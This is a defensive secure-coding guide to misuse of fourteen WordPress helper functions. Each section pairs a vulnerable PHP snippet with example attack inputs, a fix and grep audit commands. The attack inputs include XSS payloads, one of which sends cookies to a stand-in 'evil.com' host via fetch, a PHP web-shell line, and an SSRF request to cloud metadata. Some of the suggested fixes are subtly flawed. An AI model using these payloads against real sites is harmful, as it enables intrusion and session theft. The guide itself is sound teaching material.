# WordPress Helper Function Security Patterns

Common security vulnerabilities arising from misuse of WordPress helper functions.

---

## 1. wp_mail() - Email Injection

### Vulnerability Pattern

**Problem:** User-controlled email headers without validation enable email header injection attacks.

```php
// ❌ VULNERABLE: Email header injection
$to = $_POST['email'];
$subject = $_POST['subject'];
$headers = "From: " . $_POST['from_name'] . " <" . $_POST['from_email'] . ">";

wp_mail($to, $subject, $message, $headers);
```

**Attack:**
```
POST /send-email
from_email: attacker@evil.com%0ACc: victim2@target.com%0ABcc: spam-list@evil.com
```

**Impact:** Spam relay, phishing emails sent from your domain, reputation damage

### Secure Pattern

```php
// ✅ SECURE: Validate and sanitize all email components
$to = sanitize_email($_POST['email']);
if (!is_email($to)) {
    return new WP_Error('invalid_email', 'Invalid email address');
}

$subject = sanitize_text_field($_POST['subject']);

// Use WordPress's email validation for From header
$from_name = sanitize_text_field($_POST['from_name']);
$from_email = sanitize_email($_POST['from_email']);

if (!is_email($from_email)) {
    return new WP_Error('invalid_from', 'Invalid sender email');
}

// Build headers securely
$headers = array(
    'From: ' . $from_name . ' <' . $from_email . '>',
    'Content-Type: text/html; charset=UTF-8'
);

wp_mail($to, $subject, $message, $headers);
```

### Detection Command

```bash
# Find wp_mail calls with user input
grep -rn "wp_mail" lib/ | grep "\$_POST\|\$_GET" -A5
```

---

## 2. wp_redirect() - Open Redirect

### Vulnerability Pattern

**Problem:** User-controlled redirect URLs without validation enable phishing attacks.

```php
// ❌ VULNERABLE: Open redirect
$redirect_url = $_GET['redirect_to'];
wp_redirect($redirect_url);
exit;
```

**Attack:**
```
https://yoursite.com/login?redirect_to=https://evil.com/phishing
```

**Impact:** Phishing, credential theft, malware distribution

### Secure Pattern

```php
// ✅ SECURE: Validate redirect URLs
$redirect_url = $_GET['redirect_to'];

// Method 1: Whitelist allowed URLs
$allowed_urls = array(
    home_url(),
    admin_url(),
    site_url('dashboard')
);

if (!in_array($redirect_url, $allowed_urls)) {
    $redirect_url = home_url();
}

// Method 2: Use wp_safe_redirect() (only allows same-origin)
wp_safe_redirect($redirect_url);
exit;

// Method 3: Validate with wp_validate_redirect()
$redirect_url = wp_validate_redirect($redirect_url, home_url());
wp_redirect($redirect_url);
exit;
```

### Detection Command

```bash
# Find wp_redirect with user input
grep -rn "wp_redirect" lib/ | grep "\$_POST\|\$_GET\|\$_REQUEST"
```

---

## 3. get_option() / update_option() - Option Injection

### Vulnerability Pattern

**Problem:** User-controlled option names enable arbitrary option manipulation.

```php
// ❌ VULNERABLE: Arbitrary option modification
$option_name = $_POST['option'];
$option_value = $_POST['value'];
update_option($option_name, $option_value);
```

**Attack:**
```
POST /update-settings
option: users_can_register
value: 1
```

**Impact:** Privilege escalation, configuration tampering, security bypass

### Secure Pattern

```php
// ✅ SECURE: Whitelist allowed options
$option_name = $_POST['option'];
$option_value = $_POST['value'];

// Method 1: Strict whitelist
$allowed_options = array(
    'my_plugin_color_scheme',
    'my_plugin_items_per_page',
    'my_plugin_enable_feature_x'
);

if (!in_array($option_name, $allowed_options)) {
    return new WP_Error('invalid_option', 'Option not allowed');
}

// Method 2: Prefix validation
if (strpos($option_name, 'my_plugin_') !== 0) {
    return new WP_Error('invalid_prefix', 'Invalid option prefix');
}

// Sanitize value based on option type
switch ($option_name) {
    case 'my_plugin_color_scheme':
        $option_value = sanitize_hex_color($option_value);
        break;
    case 'my_plugin_items_per_page':
        $option_value = absint($option_value);
        break;
    case 'my_plugin_enable_feature_x':
        $option_value = (bool) $option_value;
        break;
}

update_option($option_name, $option_value);
```

### Detection Command

```bash
# Find option functions with user input
grep -rn "update_option\|add_option\|delete_option" lib/ | grep "\$_POST\|\$_GET"
```

---

## 4. wp_kses() - HTML Sanitization Bypass

### Vulnerability Pattern

**Problem:** Overly permissive allowed HTML tags enable XSS.

```php
// ❌ VULNERABLE: Allows dangerous attributes
$allowed_html = array(
    'a' => array('href' => true, 'onclick' => true),  // ❌ onclick = XSS
    'img' => array('src' => true, 'onerror' => true),  // ❌ onerror = XSS
    'iframe' => array('src' => true)  // ❌ iframe = XSS/clickjacking
);

$content = wp_kses($_POST['content'], $allowed_html);
echo $content;
```

**Attack:**
```html
<a href="#" onclick="alert(document.cookie)">Click me</a>
<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
<iframe src="https://evil.com/phishing"></iframe>
```

**Impact:** XSS, session hijacking, credential theft

### Secure Pattern

```php
// ✅ SECURE: Use predefined safe HTML sets
$content = wp_kses_post($_POST['content']);  // Allows safe post HTML
echo $content;

// Or for more restrictive contexts
$content = wp_kses($_POST['content'], array(
    'a' => array('href' => true, 'title' => true),
    'strong' => array(),
    'em' => array(),
    'p' => array(),
    'br' => array()
));
echo $content;

// For completely untrusted input
$content = wp_strip_all_tags($_POST['content']);
echo esc_html($content);
```

### Detection Command

```bash
# Find wp_kses with dangerous tags
grep -rn "wp_kses" lib/ -A10 | grep "onclick\|onerror\|onload\|iframe\|script"
```

---

## 5. add_query_arg() - XSS via URL Manipulation

### Vulnerability Pattern

**Problem:** add_query_arg() doesn't escape output by default.

```php
// ❌ VULNERABLE: Reflected XSS
$current_url = add_query_arg('page', $_GET['page']);
echo '<a href="' . $current_url . '">Next Page</a>';  // ❌ No escaping
```

**Attack:**
```
https://yoursite.com/page?page=1"><script>alert(1)</script>
```

**Impact:** Reflected XSS

### Secure Pattern

```php
// ✅ SECURE: Always escape URLs
$current_url = add_query_arg('page', $_GET['page']);
echo '<a href="' . esc_url($current_url) . '">Next Page</a>';

// Or use esc_url_raw() if not outputting directly
$redirect_url = esc_url_raw(add_query_arg('status', 'success'));
wp_redirect($redirect_url);
```

### Detection Command

```bash
# Find add_query_arg without esc_url
grep -rn "add_query_arg" lib/ -A2 | grep "echo\|href" | grep -v "esc_url"
```

---

## 6. wp_parse_args() - Array Injection

### Vulnerability Pattern

**Problem:** wp_parse_args() with user input can override default values unexpectedly.

```php
// ❌ VULNERABLE: User can inject arbitrary array keys
$defaults = array(
    'role' => 'subscriber',
    'status' => 'pending'
);

$args = wp_parse_args($_POST['user_data'], $defaults);
$user_id = wp_create_user($args['username'], $args['password'], $args['email']);
wp_update_user(array('ID' => $user_id, 'role' => $args['role']));
```

**Attack:**
```
POST /create-user
user_data[username]: attacker
user_data[password]: pass123
user_data[email]: attacker@evil.com
user_data[role]: administrator  ← PRIVILEGE ESCALATION
```

**Impact:** Privilege escalation, unauthorized access

### Secure Pattern

```php
// ✅ SECURE: Whitelist allowed keys
$defaults = array(
    'role' => 'subscriber',
    'status' => 'pending'
);

// Only accept whitelisted keys from user input
$user_data = array();
$allowed_keys = array('username', 'password', 'email');

foreach ($allowed_keys as $key) {
    if (isset($_POST['user_data'][$key])) {
        $user_data[$key] = sanitize_text_field($_POST['user_data'][$key]);
    }
}

// Merge with defaults (user input cannot override role/status)
$args = wp_parse_args($user_data, $defaults);

// Create user with enforced defaults
$user_id = wp_create_user($args['username'], $args['password'], sanitize_email($args['email']));
wp_update_user(array('ID' => $user_id, 'role' => 'subscriber'));  // Force subscriber role
```

### Detection Command

```bash
# Find wp_parse_args with user input as first argument
grep -rn "wp_parse_args" lib/ | grep "\$_POST\|\$_GET\|\$_REQUEST"
```

---

## 7. wp_json_encode() - JSON Injection

### Vulnerability Pattern

**Problem:** Embedding user input in JSON without escaping enables XSS in JavaScript contexts.

```php
// ❌ VULNERABLE: XSS via JSON injection
$data = array(
    'username' => $_POST['username'],  // No sanitization
    'message' => $_POST['message']
);

echo '<script>var userData = ' . wp_json_encode($data) . ';</script>';
```

**Attack:**
```
POST /save-profile
username: </script><script>alert(document.cookie)</script><script>
```

**Impact:** XSS, session hijacking

### Secure Pattern

```php
// ✅ SECURE: Escape for JavaScript context
$data = array(
    'username' => sanitize_text_field($_POST['username']),
    'message' => sanitize_textarea_field($_POST['message'])
);

// Use wp_json_encode with escaping flags
$json_data = wp_json_encode($data, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT);

// Still escape for HTML context
echo '<script>var userData = ' . esc_js($json_data) . ';</script>';

// Better: Use wp_localize_script for data passing
wp_localize_script('my-script', 'userData', $data);
```

### Detection Command

```bash
# Find wp_json_encode in inline scripts
grep -rn "wp_json_encode" lib/ -A2 | grep "<script>"
```

---

## 8. wp_insert_post() - Privilege Escalation

### Vulnerability Pattern

**Problem:** User-controlled post data without validation enables privilege escalation.

```php
// ❌ VULNERABLE: User controls post_author
$post_data = array(
    'post_title' => $_POST['title'],
    'post_content' => $_POST['content'],
    'post_author' => $_POST['author_id'],  // ❌ User can impersonate anyone
    'post_status' => $_POST['status']  // ❌ User can auto-publish
);

wp_insert_post($post_data);
```

**Attack:**
```
POST /create-post
title: Malicious Post
content: <script>...</script>
author_id: 1  ← Impersonate admin
status: publish  ← Bypass moderation
```

**Impact:** Content injection, author impersonation, moderation bypass

### Secure Pattern

```php
// ✅ SECURE: Enforce current user as author
$post_data = array(
    'post_title' => sanitize_text_field($_POST['title']),
    'post_content' => wp_kses_post($_POST['content']),
    'post_author' => get_current_user_id(),  // Force current user
    'post_status' => 'pending'  // Force moderation
);

// Check capabilities
if (!current_user_can('publish_posts')) {
    $post_data['post_status'] = 'pending';
}

// Sanitize custom fields separately
$post_id = wp_insert_post($post_data);

if (!is_wp_error($post_id)) {
    // Add post meta with validation
    update_post_meta($post_id, 'custom_field', sanitize_text_field($_POST['custom_value']));
}
```

### Detection Command

```bash
# Find wp_insert_post with user-controlled author/status
grep -rn "wp_insert_post\|wp_update_post" lib/ -A10 | grep "post_author\|post_status" | grep "\$_"
```

---

## 9. wp_remote_get() / wp_remote_post() - SSRF

### Vulnerability Pattern

**Problem:** User-controlled URLs enable Server-Side Request Forgery (SSRF).

```php
// ❌ VULNERABLE: SSRF via user-controlled URL
$api_url = $_POST['webhook_url'];
$response = wp_remote_post($api_url, array(
    'body' => json_encode($data)
));
```

**Attack:**
```
POST /configure-webhook
webhook_url: http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Impact:** Internal network scanning, cloud metadata access, credential theft

### Secure Pattern

```php
// ✅ SECURE: Validate and restrict URLs
$webhook_url = $_POST['webhook_url'];

// Validate URL format
if (!filter_var($webhook_url, FILTER_VALIDATE_URL)) {
    return new WP_Error('invalid_url', 'Invalid webhook URL');
}

// Parse URL components
$parsed = parse_url($webhook_url);

// Block internal/private IPs
$blocked_hosts = array(
    'localhost',
    '127.0.0.1',
    '0.0.0.0',
    '169.254.169.254',  // AWS metadata
    '::1'
);

if (in_array($parsed['host'], $blocked_hosts)) {
    return new WP_Error('blocked_host', 'Localhost/internal IPs not allowed');
}

// Block private IP ranges
$ip = gethostbyname($parsed['host']);
if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
    return new WP_Error('private_ip', 'Private IP ranges not allowed');
}

// Whitelist allowed schemes
if (!in_array($parsed['scheme'], array('http', 'https'))) {
    return new WP_Error('invalid_scheme', 'Only HTTP/HTTPS allowed');
}

// Make request with timeout
$response = wp_remote_post($webhook_url, array(
    'body' => json_encode($data),
    'timeout' => 5,
    'sslverify' => true  // Always verify SSL
));
```

### Detection Command

```bash
# Find wp_remote_* with user input
grep -rn "wp_remote_get\|wp_remote_post\|wp_remote_request" lib/ | grep "\$_POST\|\$_GET"
```

---

## 10. wp_upload_bits() - Arbitrary File Upload

### Vulnerability Pattern

**Problem:** User-controlled filenames and content enable malicious file uploads.

```php
// ❌ VULNERABLE: Arbitrary file upload
$filename = $_FILES['file']['name'];
$content = file_get_contents($_FILES['file']['tmp_name']);

wp_upload_bits($filename, null, $content);
```

**Attack:**
```
Upload: malicious.php
Content: <?php system($_GET['cmd']); ?>
```

**Impact:** Remote code execution, server compromise

### Secure Pattern

```php
// ✅ SECURE: Validate file type and sanitize filename
$file = $_FILES['file'];

// Check file extension whitelist
$allowed_extensions = array('jpg', 'jpeg', 'png', 'gif', 'pdf');
$file_ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));

if (!in_array($file_ext, $allowed_extensions)) {
    return new WP_Error('invalid_type', 'File type not allowed');
}

// Validate MIME type
$allowed_mimes = array(
    'image/jpeg',
    'image/png',
    'image/gif',
    'application/pdf'
);

$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime_type = finfo_file($finfo, $file['tmp_name']);
finfo_close($finfo);

if (!in_array($mime_type, $allowed_mimes)) {
    return new WP_Error('invalid_mime', 'File MIME type not allowed');
}

// Sanitize filename (remove path traversal)
$filename = sanitize_file_name($file['name']);
$filename = wp_unique_filename(wp_upload_dir()['path'], $filename);

// Read file content
$content = file_get_contents($file['tmp_name']);

// Upload with WordPress (automatically sets permissions)
$upload = wp_upload_bits($filename, null, $content);

if ($upload['error']) {
    return new WP_Error('upload_error', $upload['error']);
}

// Store file path in database (not publicly accessible URL if sensitive)
$file_path = $upload['file'];
```

### Detection Command

```bash
# Find wp_upload_bits with user input
grep -rn "wp_upload_bits" lib/ | grep "\$_FILES"
```

---

## 11. set_transient() - Cache Poisoning

### Vulnerability Pattern

**Problem:** User-controlled transient keys enable cache poisoning attacks.

```php
// ❌ VULNERABLE: Cache poisoning
$cache_key = 'user_data_' . $_GET['user_id'];
$user_data = get_user_by('id', $_GET['user_id']);
set_transient($cache_key, $user_data, HOUR_IN_SECONDS);
```

**Attack:**
```
GET /profile?user_id=1&user_id=<script>alert(1)</script>
```

**Impact:** XSS, cache poisoning, denial of service

### Secure Pattern

```php
// ✅ SECURE: Hash transient keys
$user_id = absint($_GET['user_id']);

// Use hashed key to prevent injection
$cache_key = 'user_data_' . md5('user_' . $user_id);

// Get from cache
$user_data = get_transient($cache_key);

if (false === $user_data) {
    $user_data = get_user_by('id', $user_id);

    // Sanitize before caching
    $safe_data = array(
        'display_name' => esc_html($user_data->display_name),
        'email' => sanitize_email($user_data->user_email)
    );

    set_transient($cache_key, $safe_data, HOUR_IN_SECONDS);
}

// Still escape on output
echo esc_html($user_data['display_name']);
```

### Detection Command

```bash
# Find set_transient with user input in key
grep -rn "set_transient" lib/ | grep "\$_POST\|\$_GET"
```

---

## 12. do_action() / apply_filters() - Hook Injection

### Vulnerability Pattern

**Problem:** User-controlled hook names enable arbitrary code execution.

```php
// ❌ VULNERABLE: Hook injection = RCE
$hook_name = $_POST['hook'];
do_action($hook_name, $data);
```

**Attack:**
```
POST /trigger-hook
hook: admin_init  ← Trigger admin initialization outside admin context
hook: wp_authenticate  ← Bypass authentication
```

**Impact:** Remote code execution, authentication bypass, privilege escalation

### Secure Pattern

```php
// ✅ SECURE: Never allow user-controlled hook names
// Hook names should ALWAYS be hardcoded

// Bad: Don't do this
// $hook = $_POST['hook'];
// do_action($hook);

// Good: Use hardcoded hooks with user data as parameters
$action_type = sanitize_key($_POST['action_type']);

switch ($action_type) {
    case 'send_email':
        do_action('myplugin_send_email', sanitize_email($_POST['email']));
        break;
    case 'update_settings':
        do_action('myplugin_update_settings', sanitize_text_field($_POST['setting']));
        break;
    default:
        return new WP_Error('invalid_action', 'Unknown action type');
}
```

### Detection Command

```bash
# Find do_action/apply_filters with user input in hook name (first parameter)
grep -rn "do_action\|apply_filters" lib/ | grep "\$_POST\|\$_GET" | grep -v "do_action(['\"]"
```

---

## 13. wp_set_current_user() - Authentication Bypass

### Vulnerability Pattern

**Problem:** User-controlled user ID enables authentication bypass.

```php
// ❌ VULNERABLE: Authentication bypass
if (isset($_GET['impersonate'])) {
    wp_set_current_user($_GET['impersonate']);  // ❌ CRITICAL
}
```

**Attack:**
```
GET /admin?impersonate=1  ← Become admin
```

**Impact:** Complete authentication bypass, privilege escalation

### Secure Pattern

```php
// ✅ SECURE: Never allow user-controlled wp_set_current_user()

// wp_set_current_user() should ONLY be used in these scenarios:
// 1. During authentication (after password verification)
// 2. In cron jobs (with hardcoded user ID)
// 3. In CLI commands (with explicit --user flag)

// Example: Cron job as specific user
add_action('myplugin_daily_cleanup', 'myplugin_cleanup_old_data');
function myplugin_cleanup_old_data() {
    // Set to admin user for cleanup operations
    wp_set_current_user(1);  // Hardcoded, not from user input

    // Perform cleanup...
}

// Example: User impersonation (admin-only feature)
if (isset($_GET['impersonate']) && current_user_can('manage_options')) {
    $target_user_id = absint($_GET['impersonate']);

    // Log impersonation for audit trail
    do_action('myplugin_admin_impersonation', get_current_user_id(), $target_user_id);

    wp_set_current_user($target_user_id);
}
```

### Detection Command

```bash
# Find wp_set_current_user with user input (ALWAYS a vulnerability)
grep -rn "wp_set_current_user" lib/ | grep "\$_POST\|\$_GET\|\$_REQUEST"
```

---

## 14. wp_insert_user() / wp_update_user() - Mass Assignment

### Vulnerability Pattern

**Problem:** Passing entire $_POST array enables privilege escalation.

```php
// ❌ VULNERABLE: Mass assignment
$user_data = $_POST['user'];
wp_update_user($user_data);
```

**Attack:**
```
POST /update-profile
user[ID]: 5
user[first_name]: Attacker
user[role]: administrator  ← PRIVILEGE ESCALATION
```

**Impact:** Privilege escalation, account takeover

### Secure Pattern

```php
// ✅ SECURE: Whitelist allowed fields
$user_id = get_current_user_id();

// Only accept whitelisted fields
$allowed_fields = array('first_name', 'last_name', 'description');
$user_data = array('ID' => $user_id);

foreach ($allowed_fields as $field) {
    if (isset($_POST['user'][$field])) {
        $user_data[$field] = sanitize_text_field($_POST['user'][$field]);
    }
}

// Role changes require admin capability
if (isset($_POST['user']['role']) && current_user_can('edit_users')) {
    $user_data['role'] = sanitize_key($_POST['user']['role']);
}

wp_update_user($user_data);
```

### Detection Command

```bash
# Find wp_insert_user/wp_update_user with $_POST directly
grep -rn "wp_insert_user\|wp_update_user" lib/ | grep "\$_POST\[" -A2
```

---

## Priority Matrix

| Helper Function | Risk Level | Common Misuse | Fix Complexity |
|-----------------|------------|---------------|----------------|
| wp_set_current_user() | CRITICAL | Auth bypass | Easy |
| do_action() (user hook name) | CRITICAL | RCE | Easy |
| wp_remote_* (user URL) | CRITICAL | SSRF | Medium |
| wp_upload_bits() | HIGH | RCE via file upload | Medium |
| wp_insert_post() (user author) | HIGH | Privilege escalation | Easy |
| wp_mail() | HIGH | Email injection | Easy |
| update_option() (user key) | HIGH | Config tampering | Easy |
| wp_insert_user() (mass assign) | HIGH | Privilege escalation | Easy |
| wp_redirect() (user URL) | MEDIUM | Open redirect | Easy |
| add_query_arg() | MEDIUM | Reflected XSS | Easy |
| wp_kses() (loose rules) | MEDIUM | Stored XSS | Easy |
| wp_json_encode() | MEDIUM | XSS in JS | Easy |
| wp_parse_args() | MEDIUM | Array injection | Medium |
| set_transient() (user key) | LOW-MEDIUM | Cache poisoning | Easy |

---

## Quick Audit Commands

Run these to find potential helper function misuse:

```bash
echo "=== CRITICAL: Authentication Bypass ==="
grep -rn "wp_set_current_user" lib/ | grep "\$_"

echo "=== CRITICAL: Hook Injection ==="
grep -rn "do_action\|apply_filters" lib/ | grep "\$_" | grep -v "do_action(['\"]"

echo "=== CRITICAL: SSRF ==="
grep -rn "wp_remote_get\|wp_remote_post" lib/ | grep "\$_"

echo "=== HIGH: File Upload ==="
grep -rn "wp_upload_bits" lib/ | grep "\$_FILES"

echo "=== HIGH: Privilege Escalation (Post Author) ==="
grep -rn "wp_insert_post\|wp_update_post" lib/ -A10 | grep "post_author\|post_status" | grep "\$_"

echo "=== HIGH: Email Injection ==="
grep -rn "wp_mail" lib/ | grep "\$_"

echo "=== HIGH: Option Injection ==="
grep -rn "update_option\|add_option" lib/ | grep "\$_"

echo "=== HIGH: Mass Assignment ==="
grep -rn "wp_insert_user\|wp_update_user" lib/ | grep "\$_POST\["

echo "=== MEDIUM: Open Redirect ==="
grep -rn "wp_redirect" lib/ | grep "\$_" | grep -v "wp_safe_redirect"

echo "=== MEDIUM: XSS via add_query_arg ==="
grep -rn "add_query_arg" lib/ -A2 | grep "echo\|href" | grep -v "esc_url"

echo "=== MEDIUM: Loose HTML Sanitization ==="
grep -rn "wp_kses" lib/ -A10 | grep "onclick\|onerror\|iframe\|script"

echo "=== MEDIUM: JSON Injection ==="
grep -rn "wp_json_encode" lib/ -A2 | grep "<script>"

echo "=== MEDIUM: Array Injection ==="
grep -rn "wp_parse_args" lib/ | grep "\$_"

echo "=== LOW-MEDIUM: Cache Poisoning ==="
grep -rn "set_transient" lib/ | grep "\$_"
```

---

## Summary

**Most Critical Patterns to Watch:**
1. **wp_set_current_user()** with user input → Instant authentication bypass
2. **do_action() / apply_filters()** with user-controlled hook names → RCE
3. **wp_remote_*** with user URLs → SSRF
4. **wp_upload_bits()** without validation → RCE
5. **wp_insert_post()** with user-controlled author/status → Privilege escalation

**General Rule:** Any WordPress helper function that accepts user input must validate/sanitize that input BEFORE passing it to the function. Never trust user data.

**Validation Order:**
1. **Capability check**: Can user perform this action?
2. **Nonce verification**: Is this a legitimate request?
3. **Input validation**: Is the input in the expected format?
4. **Whitelist check**: Is this value in the allowed set?
5. **Sanitization**: Clean the input for safe use
6. **Output escaping**: Escape when displaying (defense-in-depth)

**WordPress Security Principle:** "Sanitize on input, escape on output, validate always."
